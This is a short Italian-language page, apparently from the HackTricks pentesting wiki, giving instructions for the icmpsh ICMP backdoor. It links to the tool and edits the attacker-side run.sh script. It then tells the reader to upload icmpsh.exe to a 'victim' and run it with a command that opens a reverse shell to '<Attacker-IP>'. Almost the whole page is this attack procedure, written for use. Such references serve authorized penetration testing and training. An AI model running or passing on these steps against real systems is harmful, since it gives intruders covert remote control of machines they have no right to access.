{{#include ../banners/hacktricks-training.md}}

Scarica il backdoor da: [https://github.com/inquisb/icmpsh](https://github.com/inquisb/icmpsh)

# Lato client

Esegui lo script: **run.sh**

**Se ricevi un errore, prova a cambiare le righe:**
```bash
IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
IP=$(ifconfig "$IPINT" |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }')
```
**Per:**
```bash
echo Please insert the IP where you want to listen
read IP
```
# **Lato Vittima**

Carica **icmpsh.exe** sulla vittima ed esegui:
```bash
icmpsh.exe -t <Attacker-IP> -d 500 -b 30 -s 128
```
{{#include ../banners/hacktricks-training.md}}
